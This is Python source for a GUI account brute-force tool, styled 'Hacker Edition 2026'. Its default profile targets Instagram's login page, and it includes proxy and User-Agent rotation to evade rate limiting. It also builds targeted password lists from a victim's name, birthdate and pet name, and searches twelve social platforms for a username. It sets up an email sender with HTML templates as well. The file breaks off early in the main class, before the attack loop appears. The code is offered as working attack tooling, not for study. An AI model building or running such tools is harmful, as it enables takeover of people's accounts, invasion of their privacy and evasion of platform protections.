#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Professional Brute Force Tool - Hacker Edition 2026
- Master password protection
- Attack profiles with failure message detection
- Proxy rotation, User-Agent rotation
- Multi-threaded browser workers
- Auto-detect login fields
- Modern hacker UI with neon accents, glows, and animations
- Password list generator based on personal info
- Username search across multiple platforms
- Fully rounded buttons with hover effects and pulse animation
"""

import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk, colorchooser, simpledialog
import threading
import queue
import time
import os
import json
import random
import hashlib
import smtplib
import math
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import requests

# ---------- Paths ----------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COLORS_CONFIG_FILE = os.path.join(SCRIPT_DIR, "colors_config.json")
ATTACKS_FILE = os.path.join(SCRIPT_DIR, "attacks_config.json")
PASSWORD_FILE = os.path.join(SCRIPT_DIR, ".tool_pass.hash")

# ---------- Hacker Theme Colors ----------
HACKER_COLORS = {
    "bg": "#0a0a0a",
    "fg": "#00ff99",
    "entry_bg": "#111111",
    "entry_fg": "#00ff99",
    "button_bg": "#111111",
    "button_fg": "#00ff99",
    "button_active_bg": "#00ff99",
    "button_active_fg": "#000000",
    "tab_bg": "#0f0f0f",
    "tab_fg": "#00ff99",
    "log_bg": "#050505",
    "log_fg": "#00cc88",
    "stats_bg": "#0a0a0a",
    "stats_fg": "#00ff99",
    "success_fg": "#00ff66",
    "failure_fg": "#ff3366",
    "border_color": "#00ff99",
    "hover_bg": "#00ff99",
    "hover_fg": "#000000",
    "pulse_color": "#00ff99",
}

# ---------- Default Instagram Config ----------
DEFAULT_CONFIG = {
    "name": "Instagram (Default)",
    "url": "https://www.instagram.com/accounts/login/",
    "username_field_type": "name",
    "username_field_selector": "email",
    "password_field_type": "name",
    "password_field_selector": "pass",
    "submit_button_selector": "button[type='submit']",
    "success_indicator": "url_change",
    "success_text": "",
    "failure_text": "Le mot de passe est incorrect",
    "timeout": 5000,
}

# ---------- Custom Style Setup ----------
def setup_style(style, colors):
    style.theme_use('clam')
    style.configure("TFrame", background=colors["bg"])
    style.configure("TLabel", background=colors["bg"], foreground=colors["fg"], font=('Consolas', 9))
    style.configure("TLabelframe", background=colors["bg"], foreground=colors["fg"], borderwidth=1, relief="solid")
    style.configure("TLabelframe.Label", background=colors["bg"], foreground=colors["fg"], font=('Consolas', 9, 'bold'))
    # Rounded buttons for ttk
    style.configure("Rounded.TButton", background=colors["button_bg"], foreground=colors["button_fg"],
                    borderwidth=1, relief="solid", focusthickness=0, padding=6, font=('Consolas', 9, 'bold'),
                    borderradius=20)
    style.map("Rounded.TButton",
              background=[("active", colors["button_active_bg"])],
              foreground=[("active", colors["button_active_fg"])],
              bordercolor=[("active", colors["border_color"])])
    style.configure("Pulse.TButton", background=colors["button_bg"], foreground=colors["button_fg"],
                    borderwidth=1, relief="solid", focusthickness=0, padding=6, font=('Consolas', 9, 'bold'),
                    borderradius=20)
    style.map("Pulse.TButton",
              background=[("active", colors["button_active_bg"])],
              foreground=[("active", colors["button_active_fg"])],
              bordercolor=[("active", colors["border_color"])])
    # Default for other ttk widgets
    style.configure("TCheckbutton", background=colors["bg"], foreground=colors["fg"], font=('Consolas', 9))
    style.configure("TRadiobutton", background=colors["bg"], foreground=colors["fg"], font=('Consolas', 9))
    style.configure("TEntry", fieldbackground=colors["entry_bg"], foreground=colors["entry_fg"],
                    borderwidth=1, relief="solid", font=('Consolas', 9))
    style.configure("TCombobox", fieldbackground=colors["entry_bg"], foreground=colors["entry_fg"],
                    borderwidth=1, relief="solid", font=('Consolas', 9))
    style.configure("TNotebook", background=colors["bg"], borderwidth=1, relief="solid")
    style.configure("TNotebook.Tab", background=colors["tab_bg"], foreground=colors["tab_fg"],
                    padding=[12, 5], font=('Consolas', 9, 'bold'), borderwidth=1)
    style.map("TNotebook.Tab", background=[("selected", colors["hover_bg"])],
              foreground=[("selected", colors["hover_fg"])])

class AttackConfigDialog:
    """Dialog for adding/editing an attack configuration."""
    def __init__(self, parent, config=None):
        self.parent = parent
        self.config = config.copy() if config else {}
        self.result = None
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Attack Configuration" if not config else "Edit Attack Configuration")
        self.dialog.geometry("580x620")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.dialog.configure(bg=HACKER_COLORS["bg"])
        self.create_widgets()
        self.dialog.wait_window()

    def create_widgets(self):
        frame = ttk.Frame(self.dialog, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Profile Name:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.name_var = tk.StringVar(value=self.config.get("name", ""))
        ttk.Entry(frame, textvariable=self.name_var, width=45).grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(frame, text="Login URL:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.url_var = tk.StringVar(value=self.config.get("url", ""))
        ttk.Entry(frame, textvariable=self.url_var, width=45).grid(row=1, column=1, padx=5, pady=2)

        # Username field
        ttk.Label(frame, text="Username Field:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        uname_frame = ttk.Frame(frame)
        uname_frame.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        self.uname_type = tk.StringVar(value=self.config.get("username_field_type", "name"))
        ttk.Radiobutton(uname_frame, text="name=", variable=self.uname_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(uname_frame, text="id=", variable=self.uname_type, value="id").pack(side=tk.LEFT)
        self.uname_selector = tk.StringVar(value=self.config.get("username_field_selector", ""))
        ttk.Entry(uname_frame, textvariable=self.uname_selector, width=18).pack(side=tk.LEFT, padx=5)

        # Password field
        ttk.Label(frame, text="Password Field:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        pwd_frame = ttk.Frame(frame)
        pwd_frame.grid(row=3, column=1, sticky=tk.W, padx=5, pady=2)
        self.pwd_type = tk.StringVar(value=self.config.get("password_field_type", "name"))
        ttk.Radiobutton(pwd_frame, text="name=", variable=self.pwd_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(pwd_frame, text="id=", variable=self.pwd_type, value="id").pack(side=tk.LEFT)
        self.pwd_selector = tk.StringVar(value=self.config.get("password_field_selector", ""))
        ttk.Entry(pwd_frame, textvariable=self.pwd_selector, width=18).pack(side=tk.LEFT, padx=5)

        # Submit button selector
        ttk.Label(frame, text="Submit Button (CSS):").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        self.submit_selector = tk.StringVar(value=self.config.get("submit_button_selector", ""))
        ttk.Entry(frame, textvariable=self.submit_selector, width=45).grid(row=4, column=1, padx=5, pady=2)

        # Success indicator
        ttk.Label(frame, text="Success Indicator:").grid(row=5, column=0, sticky=tk.W, padx=5, pady=2)
        ind_frame = ttk.Frame(frame)
        ind_frame.grid(row=5, column=1, sticky=tk.W, padx=5, pady=2)
        self.indicator = tk.StringVar(value=self.config.get("success_indicator", "url_change"))
        ttk.Radiobutton(ind_frame, text="URL change (no 'login' in URL)", variable=self.indicator, value="url_change").pack(anchor=tk.W)
        ttk.Radiobutton(ind_frame, text="Text in page", variable=self.indicator, value="text").pack(anchor=tk.W)
        self.success_text_var = tk.StringVar(value=self.config.get("success_text", ""))
        ttk.Entry(ind_frame, textvariable=self.success_text_var, width=35).pack(anchor=tk.W, padx=20, pady=2)

        # Failure text (required for failure detection)
        ttk.Label(frame, text="Failure Message Text (required):").grid(row=6, column=0, sticky=tk.W, padx=5, pady=2)
        self.failure_text_var = tk.StringVar(value=self.config.get("failure_text", ""))
        ttk.Entry(frame, textvariable=self.failure_text_var, width=45).grid(row=6, column=1, padx=5, pady=2)

        # Timeout
        ttk.Label(frame, text="Timeout (ms):").grid(row=7, column=0, sticky=tk.W, padx=5, pady=2)
        self.timeout_var = tk.IntVar(value=self.config.get("timeout", 5000))
        ttk.Spinbox(frame, from_=1000, to=30000, textvariable=self.timeout_var, width=10).grid(row=7, column=1, sticky=tk.W, padx=5, pady=2)

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=8, column=0, columnspan=2, pady=10)
        ttk.Button(btn_frame, text="Save", command=self.save, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Cancel", command=self.cancel, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)

    def save(self):
        name = self.name_var.get().strip()
        if not name:
            messagebox.showerror("Error", "Profile name is required.")
            return
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Login URL is required.")
            return
        failure_text = self.failure_text_var.get().strip()
        if not failure_text:
            messagebox.showerror("Error", "Failure message text is required for correct detection.")
            return
        self.result = {
            "name": name,
            "url": url,
            "username_field_type": self.uname_type.get(),
            "username_field_selector": self.uname_selector.get(),
            "password_field_type": self.pwd_type.get(),
            "password_field_selector": self.pwd_selector.get(),
            "submit_button_selector": self.submit_selector.get(),
            "success_indicator": self.indicator.get(),
            "success_text": self.success_text_var.get(),
            "failure_text": failure_text,
            "timeout": self.timeout_var.get(),
        }
        self.dialog.destroy()

    def cancel(self):
        self.result = None
        self.dialog.destroy()


class FailureToolDialog:
    """Simplified dialog for creating a new attack based on failure message."""
    def __init__(self, parent, auto_detect_callback):
        self.parent = parent
        self.auto_detect_callback = auto_detect_callback
        self.result = None
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("New Failure Detection Tool")
        self.dialog.geometry("620x580")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.dialog.configure(bg=HACKER_COLORS["bg"])
        self.create_widgets()
        self.dialog.wait_window()

    def create_widgets(self):
        frame = ttk.Frame(self.dialog, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Tool Name:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.name_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.name_var, width=50).grid(row=0, column=1, padx=5, pady=2)

        # URL with auto-detect button
        url_frame = ttk.Frame(frame)
        url_frame.grid(row=1, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=2)
        ttk.Label(url_frame, text="Login URL:").pack(side=tk.LEFT)
        self.url_var = tk.StringVar()
        self.url_entry = ttk.Entry(url_frame, textvariable=self.url_var, width=40)
        self.url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.auto_detect_btn = ttk.Button(url_frame, text="Auto-Detect Fields", command=self.auto_detect, style="Rounded.TButton")
        self.auto_detect_btn.pack(side=tk.LEFT, padx=5)

        # Username field
        ttk.Label(frame, text="Username Field:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        uname_frame = ttk.Frame(frame)
        uname_frame.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        self.uname_type = tk.StringVar(value="name")
        ttk.Radiobutton(uname_frame, text="name=", variable=self.uname_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(uname_frame, text="id=", variable=self.uname_type, value="id").pack(side=tk.LEFT)
        self.uname_selector = tk.StringVar()
        ttk.Entry(uname_frame, textvariable=self.uname_selector, width=20).pack(side=tk.LEFT, padx=5)

        # Password field
        ttk.Label(frame, text="Password Field:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        pwd_frame = ttk.Frame(frame)
        pwd_frame.grid(row=3, column=1, sticky=tk.W, padx=5, pady=2)
        self.pwd_type = tk.StringVar(value="name")
        ttk.Radiobutton(pwd_frame, text="name=", variable=self.pwd_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(pwd_frame, text="id=", variable=self.pwd_type, value="id").pack(side=tk.LEFT)
        self.pwd_selector = tk.StringVar()
        ttk.Entry(pwd_frame, textvariable=self.pwd_selector, width=20).pack(side=tk.LEFT, padx=5)

        # Failure message (required)
        ttk.Label(frame, text="Incorrect Password Message (required):").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        self.failure_text_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.failure_text_var, width=50).grid(row=4, column=1, padx=5, pady=2)
        ttk.Label(frame, text="Exact text that appears when password is wrong").grid(row=5, column=1, sticky=tk.W, padx=5)

        # Success indicator (optional)
        ttk.Label(frame, text="Success Indicator:").grid(row=6, column=0, sticky=tk.W, padx=5, pady=2)
        ind_frame = ttk.Frame(frame)
        ind_frame.grid(row=6, column=1, sticky=tk.W, padx=5, pady=2)
        self.success_indicator = tk.StringVar(value="url_change")
        ttk.Radiobutton(ind_frame, text="URL change (no 'login' in URL)", variable=self.success_indicator, value="url_change").pack(anchor=tk.W)
        ttk.Radiobutton(ind_frame, text="Text in page (optional)", variable=self.success_indicator, value="text").pack(anchor=tk.W)
        self.success_text_var = tk.StringVar()
        ttk.Entry(ind_frame, textvariable=self.success_text_var, width=35).pack(anchor=tk.W, padx=20, pady=2)

        # Timeout
        ttk.Label(frame, text="Timeout (ms):").grid(row=7, column=0, sticky=tk.W, padx=5, pady=2)
        self.timeout_var = tk.IntVar(value=5000)
        ttk.Spinbox(frame, from_=1000, to=30000, textvariable=self.timeout_var, width=10).grid(row=7, column=1, sticky=tk.W, padx=5, pady=2)

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=8, column=0, columnspan=2, pady=10)
        ttk.Button(btn_frame, text="Create Tool", command=self.save, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Cancel", command=self.cancel, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)

    def auto_detect(self):
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a URL first.")
            return
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(url, wait_until="domcontentloaded", timeout=10000)
                inputs = page.query_selector_all("input")
                username_candidates = []
                password_candidates = []
                for inp in inputs:
                    inp_type = inp.get_attribute("type") or ""
                    inp_name = inp.get_attribute("name") or ""
                    inp_id = inp.get_attribute("id") or ""
                    if inp_type == "password":
                        password_candidates.append((inp_name, inp_id))
                    elif inp_type in ("text", "email", "tel", None):
                        if any(key in inp_name.lower() for key in ["user", "email", "login", "username"]):
                            username_candidates.append((inp_name, inp_id))
                browser.close()
            if username_candidates:
                name_or_id, selector = username_candidates[0]
                if name_or_id:
                    self.uname_type.set("name")
                    self.uname_selector.set(name_or_id)
                elif selector:
                    self.uname_type.set("id")
                    self.uname_selector.set(selector)
                messagebox.showinfo("Auto-Detect", f"Username field: {name_or_id or selector}")
            else:
                messagebox.showwarning("Auto-Detect", "Could not detect username field.")
            if password_candidates:
                name_or_id, selector = password_candidates[0]
                if name_or_id:
                    self.pwd_type.set("name")
                    self.pwd_selector.set(name_or_id)
                elif selector:
                    self.pwd_type.set("id")
                    self.pwd_selector.set(selector)
                messagebox.showinfo("Auto-Detect", f"Password field: {name_or_id or selector}")
            else:
                messagebox.showwarning("Auto-Detect", "Could not detect password field.")
        except Exception as e:
            messagebox.showerror("Auto-Detect Error", str(e))

    def save(self):
        name = self.name_var.get().strip()
        if not name:
            messagebox.showerror("Error", "Tool name is required.")
            return
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Login URL is required.")
            return
        failure_text = self.failure_text_var.get().strip()
        if not failure_text:
            messagebox.showerror("Error", "Incorrect password message is required.")
            return
        self.result = {
            "name": name,
            "url": url,
            "username_field_type": self.uname_type.get(),
            "username_field_selector": self.uname_selector.get(),
            "password_field_type": self.pwd_type.get(),
            "password_field_selector": self.pwd_selector.get(),
            "submit_button_selector": "",
            "success_indicator": self.success_indicator.get(),
            "success_text": self.success_text_var.get().strip() if self.success_indicator.get() == "text" else "",
            "failure_text": failure_text,
            "timeout": self.timeout_var.get(),
        }
        self.dialog.destroy()

    def cancel(self):
        self.result = None
        self.dialog.destroy()


class PasswordListDialog:
    """Dialog to generate a password list based on personal information."""
    def __init__(self, parent):
        self.parent = parent
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Generate Password List")
        self.dialog.geometry("550x500")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.dialog.configure(bg=HACKER_COLORS["bg"])
        self.create_widgets()
        self.dialog.wait_window()

    def create_widgets(self):
        frame = ttk.Frame(self.dialog, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        # Input fields
        ttk.Label(frame, text="First Name:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.first_name = tk.StringVar()
        ttk.Entry(frame, textvariable=self.first_name, width=30).grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(frame, text="Last Name:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.last_name = tk.StringVar()
        ttk.Entry(frame, textvariable=self.last_name, width=30).grid(row=1, column=1, padx=5, pady=2)

        ttk.Label(frame, text="Username:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.username = tk.StringVar()
        ttk.Entry(frame, textvariable=self.username, width=30).grid(row=2, column=1, padx=5, pady=2)

        ttk.Label(frame, text="Birth Year (YYYY):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        self.year = tk.StringVar()
        ttk.Entry(frame, textvariable=self.year, width=10).grid(row=3, column=1, sticky=tk.W, padx=5, pady=2)

        ttk.Label(frame, text="Birth Month (1-12):").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        self.month = tk.StringVar()
        ttk.Entry(frame, textvariable=self.month, width=10).grid(row=4, column=1, sticky=tk.W, padx=5, pady=2)

        ttk.Label(frame, text="Birth Day (1-31):").grid(row=5, column=0, sticky=tk.W, padx=5, pady=2)
        self.day = tk.StringVar()
        ttk.Entry(frame, textvariable=self.day, width=10).grid(row=5, column=1, sticky=tk.W, padx=5, pady=2)

        ttk.Label(frame, text="Pet Name / Other:").grid(row=6, column=0, sticky=tk.W, padx=5, pady=2)
        self.pet = tk.StringVar()
        ttk.Entry(frame, textvariable=self.pet, width=30).grid(row=6, column=1, padx=5, pady=2)

        # Checkboxes for leet, numbers
        self.include_numbers = tk.BooleanVar(value=True)
        ttk.Checkbutton(frame, text="Add numbers (0-9)", variable=self.include_numbers).grid(row=7, column=0, columnspan=2, sticky=tk.W, padx=5, pady=2)

        self.include_leet = tk.BooleanVar(value=True)
        ttk.Checkbutton(frame, text="Leet speak (a->@, e->3, etc.)", variable=self.include_leet).grid(row=8, column=0, columnspan=2, sticky=tk.W, padx=5, pady=2)

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=9, column=0, columnspan=2, pady=10)
        ttk.Button(btn_frame, text="Generate & Save", command=self.generate, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Cancel", command=self.dialog.destroy, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)

    def generate(self):
        # Collect data
        first = self.first_name.get().strip()
        last = self.last_name.get().strip()
        user = self.username.get().strip()
        year = self.year.get().strip()
        month = self.month.get().strip()
        day = self.day.get().strip()
        pet = self.pet.get().strip()

        # Build base words list
        base_words = []
        if first:
            base_words.append(first)
            base_words.append(first.lower())
            base_words.append(first.capitalize())
        if last:
            base_words.append(last)
            base_words.append(last.lower())
            base_words.append(last.capitalize())
        if user:
            base_words.append(user)
            base_words.append(user.lower())
        if pet:
            base_words.append(pet)
            base_words.append(pet.lower())

        # If no data provided, show error
        if not base_words:
            messagebox.showerror("Error", "Please provide at least one piece of information.")
            return

        # Generate combinations
        passwords = set()
        # Simple combinations
        for w in base_words:
            passwords.add(w)
            if year:
                passwords.add(w + year)
                passwords.add(w + year[-2:])  # last two digits
            if month:
                passwords.add(w + month.zfill(2))
            if day:
                passwords.add(w + day.zfill(2))
            if year and month and day:
                ddmmyy = day.zfill(2) + month.zfill(2) + year[-2:]
                mmddyy = month.zfill(2) + day.zfill(2) + year[-2:]
                yymmdd = year[-2:] + month.zfill(2) + day.zfill(2)
                passwords.add(w + ddmmyy)
                passwords.add(w + mmddyy)
                passwords.add(w + yymmdd)
                passwords.add(ddmmyy + w)
                passwords.add(mmddyy + w)
                passwords.add(yymmdd + w)

        # Combine first and last
        if first and last:
            fl = first + last
            passwords.add(fl)
            passwords.add(fl.lower())
            if year:
                passwords.add(fl + year)
                passwords.add(fl + year[-2:])
            lf = last + first
            passwords.add(lf)
            passwords.add(lf.lower())
            if year:
                passwords.add(lf + year)
                passwords.add(lf + year[-2:])

        # Add numbers suffix if selected
        if self.include_numbers.get():
            new_set = set()
            for pwd in passwords:
                for i in range(10):
                    new_set.add(pwd + str(i))
                    new_set.add(pwd + str(i)*2)
                    new_set.add(pwd + str(i)*3)
            passwords.update(new_set)

        # Leet speak (simple)
        if self.include_leet.get():
            leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'}
            new_set = set()
            for pwd in passwords:
                new_pwd = pwd
                for ch, rep in leet_map.items():
                    new_pwd = new_pwd.replace(ch, rep)
                if new_pwd != pwd:
                    new_set.add(new_pwd)
                # Also apply to uppercase?
                new_pwd_upper = pwd.upper()
                for ch, rep in leet_map.items():
                    new_pwd_upper = new_pwd_upper.replace(ch.upper(), rep)
                if new_pwd_upper != pwd.upper():
                    new_set.add(new_pwd_upper)
            passwords.update(new_set)

        # Remove duplicates and sort
        password_list = sorted(passwords, key=len, reverse=True)

        # Save to file
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    for p in password_list:
                        f.write(p + "\n")
                messagebox.showinfo("Success", f"Password list saved with {len(password_list)} entries.")
                self.dialog.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Could not save file: {e}")


class UsernameSearchDialog:
    """Dialog to search for a username across multiple platforms."""
    def __init__(self, parent):
        self.parent = parent
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Search Profile")
        self.dialog.geometry("700x600")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.dialog.configure(bg=HACKER_COLORS["bg"])
        self.create_widgets()
        self.dialog.wait_window()

    def create_widgets(self):
        frame = ttk.Frame(self.dialog, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        # Username entry
        ttk.Label(frame, text="Username to search:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.username_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.username_var, width=40).grid(row=0, column=1, padx=5, pady=5)

        # Site selection frame
        site_frame = ttk.LabelFrame(frame, text="Select platforms to search", padding=5)
        site_frame.grid(row=1, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=5)

        # Define sites with their URLs (use a template with {username})
        self.sites = {
            "Instagram": "https://www.instagram.com/{}/",
            "TikTok": "https://www.tiktok.com/@{}",
            "Twitter": "https://twitter.com/{}",
            "Facebook": "https://www.facebook.com/{}",
            "Snapchat": "https://www.snapchat.com/add/{}",
            "YouTube": "https://www.youtube.com/@{}",
            "Telegram": "https://t.me/{}",
            "Spotify": "https://open.spotify.com/user/{}",
            "GitHub": "https://github.com/{}",
            "Reddit": "https://www.reddit.com/user/{}",
            "Pinterest": "https://www.pinterest.com/{}/",
            "LinkedIn": "https://www.linkedin.com/in/{}",
        }

        # Variables for checkboxes
        self.site_vars = {}
        row = 0
        col = 0
        for name in self.sites.keys():
            var = tk.BooleanVar(value=True)
            self.site_vars[name] = var
            cb = ttk.Checkbutton(site_frame, text=name, variable=var)
            cb.grid(row=row, column=col, sticky=tk.W, padx=10, pady=2)
            col += 1
            if col >= 3:
                col = 0
                row += 1

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=2, column=0, columnspan=2, pady=10)
        self.search_btn = ttk.Button(btn_frame, text="Start Search", command=self.start_search, style="Rounded.TButton")
        self.search_btn.pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Select All", command=self.select_all, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Deselect All", command=self.deselect_all, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Cancel", command=self.dialog.destroy, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)

        # Results area
        ttk.Label(frame, text="Results:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
        self.results_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=18, font=("Courier", 9))
        self.results_text.grid(row=4, column=0, columnspan=2, padx=5, pady=5, sticky=tk.NSEW)

        # Progress bar
        self.progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=400, mode='indeterminate')
        self.progress.grid(row=5, column=0, columnspan=2, pady=5)
        self.progress.grid_remove()

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(4, weight=1)

    def select_all(self):
        for var in self.site_vars.values():
            var.set(True)

    def deselect_all(self):
        for var in self.site_vars.values():
            var.set(False)

    def start_search(self):
        username = self.username_var.get().strip()
        if not username:
            messagebox.showerror("Error", "Please enter a username.")
            return

        selected_sites = [name for name, var in self.site_vars.items() if var.get()]
        if not selected_sites:
            messagebox.showerror("Error", "Please select at least one platform.")
            return

        self.search_btn.config(state=tk.DISABLED)
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, f"Searching for '{username}' on {len(selected_sites)} platforms...\n")
        self.progress.grid()
        self.progress.start(10)

        # Run search in thread
        def search_thread():
            results = []
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            for site in selected_sites:
                url_template = self.sites[site]
                url = url_template.format(username)
                try:
                    r = requests.get(url, headers=headers, timeout=10, allow_redirects=False)
                    if r.status_code == 200:
                        results.append((site, "✅ Found", url))
                    elif r.status_code in (301, 302):
                        r2 = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
                        if r2.status_code == 200:
                            results.append((site, "✅ Found (redirected)", url))
                        else:
                            results.append((site, f"❌ Not found (status {r2.status_code})", url))
                    elif r.status_code == 404:
                        results.append((site, "❌ Not found", url))
                    else:
                        results.append((site, f"⚠️ Status {r.status_code}", url))
                except requests.exceptions.Timeout:
                    results.append((site, "⚠️ Timeout", url))
                except Exception as e:
                    results.append((site, f"⚠️ Error: {str(e)[:50]}", url))

            self.dialog.after(0, lambda: self.display_results(results))
            self.dialog.after(0, self.progress.stop)
            self.dialog.after(0, self.progress.grid_remove)
            self.dialog.after(0, lambda: self.search_btn.config(state=tk.NORMAL))

        threading.Thread(target=search_thread, daemon=True).start()

    def display_results(self, results):
        self.results_text.delete(1.0, tk.END)
        found = [r for r in results if "✅" in r[1]]
        not_found = [r for r in results if "❌" in r[1]]
        errors = [r for r in results if "⚠️" in r[1]]
        self.results_text.insert(tk.END, f"Summary: {len(found)} found, {len(not_found)} not found, {len(errors)} errors.\n\n")
        for site, status, url in results:
            self.results_text.insert(tk.END, f"{site:15} : {status}\n   {url}\n")
        self.results_text.see(tk.END)


class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Tool - Hacker Edition 2026")
        self.root.geometry("1500x900")
        self.root.minsize(1000, 600)
        self.root.resizable(True, True)

        # ---------- Variables ----------
        self.mode = tk.StringVar(value="single")
        self.username_single = tk.StringVar()
        self.userlist_path = tk.StringVar()
        self.passlist_path = tk.StringVar()
        self.pass_single = tk.StringVar()
        self.use_proxy = tk.BooleanVar(value=True)
        self.proxy_path = tk.StringVar()
        self.proxy_type = tk.StringVar(value="socks5")
        self.useragent_path = tk.StringVar()
        self.show_browser = tk.BooleanVar(value=True)
        self.num_browsers = tk.IntVar(value=2)
        self.log_font_size = tk.IntVar(value=9)

        self.custom_colors = HACKER_COLORS.copy()
        self.load_color_config()

        # Log format settings
        self.log_fields = {
            "timestamp": tk.BooleanVar(value=True),
            "attempt_num": tk.BooleanVar(value=True),
            "username": tk.BooleanVar(value=True),
            "password": tk.BooleanVar(value=True),
            "proxy": tk.BooleanVar(value=True),
            "result": tk.BooleanVar(value=True),
        }

        # Attack configurations
        self.attacks = []
        self.selected_attack = None
        self.attack_mode = tk.StringVar(value="saved")
        self.custom_url = tk.StringVar()
        self.username_field_type = tk.StringVar(value="name")
        self.username_field_selector = tk.StringVar()
        self.password_field_type = tk.StringVar(value="name")
        self.password_field_selector = tk.StringVar()
        self.submit_button_selector = tk.StringVar()
        self.success_indicator = tk.StringVar(value="url_change")
        self.success_text = tk.StringVar()
        self.failure_text = tk.StringVar()
        self.timeout_var = tk.IntVar(value=5000)

        # Runtime
        self.running = False
        self.stop_flag = threading.Event()
        self.log_queue = queue.Queue()
        self.success_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.total_attempts = 0
        self.tested_attempts = 0

        # Proxy checker
        self.proxy_check_path = tk.StringVar()
        self.proxy_check_result_text = None

        # Email sender
        self.email_sender = tk.StringVar()
        self.email_password = tk.StringVar()
        self.email_receiver = tk.StringVar()
        self.email_html_path = tk.StringVar()
        self.email_log_text = None

        # Animation variables
        self.spinner_canvas = None
        self.spinner_angle = 0
        self.spinner_after_id = None
        self.pulse_after_id = None
        self.pulse_direction = 1
        self.pulse_intensity = 0

        # Load saved attacks
        self.load_attacks_data()

        # Build UI
        self.create_widgets()
        self.update_attack_dropdown()
        self.apply_theme()
        self.update_gui()
        self.start_button_pulse()

    # ---------- Attack Config Management ----------
    def load_attacks_data(self):
        if os.path.exists(ATTACKS_FILE):
            try:
                with open(ATTACKS_FILE, 'r', encoding='utf-8') as f:
                    self.attacks = json.load(f)
            except:
                self.attacks = []
        if not any(a.get("name") == "Instagram (Default)" for a in self.attacks):
            default = DEFAULT_CONFIG.copy()
            default["failure_text"] = "Le mot de passe est incorrect"
            self.attacks.append(default)
